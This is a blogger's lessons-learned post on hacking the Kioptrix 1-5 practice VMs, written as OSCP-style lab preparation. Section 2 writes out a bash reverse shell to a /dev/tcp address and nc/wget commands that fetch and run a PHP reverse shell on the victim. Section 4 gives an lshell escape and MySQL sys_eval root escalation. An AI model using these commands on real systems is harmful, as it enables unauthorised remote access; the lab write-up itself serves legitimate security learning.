# Kioptrix 1-5: Lessons Learned

> "The majority of vulnerabilities in the Linux kernel... have been released just recently" ([source]( https://forums.grsecurity.net/viewtopic.php?f=7&t=4476))

The Kioptrix VMs have a reputation for being excellent, albeit somewhat easy VMs with real practical vulnerabilities similar to those in the OSCP exam. This afternoon, I set myself a challenge to blast through all five as quickly as possible.

While the vulns in Kioptrix are now ancient and long-patched, who knows what kind of nasty vulns lurk in the kernel source today?

There are more than enough walkthroughs already available for these VMs so instead I'm just going to be listing some of my observations.

### 1
- Ancient exploit code dating back to 2002 can still be taken advantage of so long as you are willing to update it. I spent a while fixing the C code, but there are already [guides out there](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) for doing so. In my case I had to compile with libssl1.0-dev rather than libssl-dev, and I also removed the line that wgets necessary file onto the victim machine - better to drop into a shell and download a file yourself rather than rely on an old link...
- Searchsploit is very helpful, but sometimes it's information overload... searching for `samba 2.2` produced 17 results, most of which are different versions of the same exploit which no longer work (including the Metasploit modules). On the other hand, `linux/remote/10.c` instantly popped the box, and apparently targets multiple UNIXes - ideally there should be a reliability rating.
- Lessons learned: when exploiting older vulnerabilities, investigate the different options, and prepare to update some C headers.

### 2
- I spent a while working out how to get the best shell from the command injection vuln. Initially, I went with `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` which worked fine, but knowing the server was running PHP I soon recalled the following pair of commands would be great for putting an arbitrary file/shell onto it: `cat phpreverseshell.php | nc -lvp 1234` (attacker) and `wget 192.168.56.101:1234 -O /tmp/meep.php` then `php /tmp/meep.php` (victim)
- I connected to the MySQL database early on in this challenge and wasted too much time trying to use the passwords I found, to no avail. I should have been looking for other vulnerabilities simultaneously.
- [CVE-2009-2698](https://www.exploit-db.com/exploits/9542/), a kernel null dereferencing bug, was devastating, allowing instant escalation to root. 

### 3
- This VM contained so much vulnerable stuff, it was the hacker equivalent of being a kid in a candy shop. There was even a stray Metasploit installation sitting in the /opt directory for some reason.
- If an application complains that it wants an xterm-256 color console over ssh, the problem can be solved simply by running `export TERM=xterm`.
- I was getting segmentation faults in the privileged HT editor program whenever I tried to save files; it took me a few minutes to realise I forget to run it as sudo. Lessons learned: don't make that mistake again.

### 4
- When this VM was created, lshell (a Python restricted shell) was vulnerable to a pretty serious escape (`echo os.system(‘/bin/bash’)`). I also tried numerous newer breakouts reported in the [issue tracker](https://github.com/ghantoos/lshell/issues/) and none were functional. So it seems a bunch more vulns or regressions were introduced even after this big one was patched.
- Someone wrote [exploit code](https://www.exploit-db.com/exploits/39632/) for the lshell vuln. This is total overkill, especially given that the exploit only gives you a pseudo-shell! 
- Running MySQL as root is a terrible idea. One way to exploit is by using `SELECT sys_eval('command')` statements to escalate to root after loading in the [system functions library](https://github.com/sqlmapproject/sqlmap/tree/master/udf). This time round the library was helpfully included for us.
- Turns out there was a critical kernel root vuln in this one too, [sock_sendpage](https://www.exploit-db.com/exploits/9479/).
- Lessons learned: apps that were insecure once, and then patched, could easily become insecure again as buggy new features are added.

### 5
- This took the longest to get started on by far. I initially missed the comment in the HTML page as at a glance it just looked like a standard META tag. Also, I should have written a quick script for automatically exploring the file inclusion vulnerability rather than paging around by hand.
- PHPTax, why haven't I heard of this before?!
- The PHPTax exploit worked even though the user agent string wasn't what was specified in the "Allow from" Apache config. I'm not sure why.
- When trying to compile the final root exploit on the FreeBSD box, I kept getting the error: `/usr/lib/crt1.o: In function _start': crt1.c:(.text+0x8a): undefined reference to main'`. I thought I was missing some shared libraries, and was trying all sorts of things, but then suddenly realised that the file I was trying to compile was 0 bytes size. D'oh. I was tired at this point and had gotten the netcat syntax slightly wrong (in Debian the -p flag must explicitly be used, whereas nc -l 3333 works on some other platforms..)
- There was an intrusion detection system (OSSec) but it never got in my way.
- Lessons learned: it's worth taking the time to script up a task that looks like it might be repetitive. There is such a thing as an insecure PHP app for doing your taxes. Always use the verbose flag with nc to catch any obvious errors.

All in all, it was a satisfying afternoon, an historic tour of some heavy-hitting vulnerabilities. The VMs are well designed and get progressively more challenging. It's a bit 'point-and-click' with all the ready-made exploit code, but this is what pentesting often involves after all (besides a lot of report-writing).
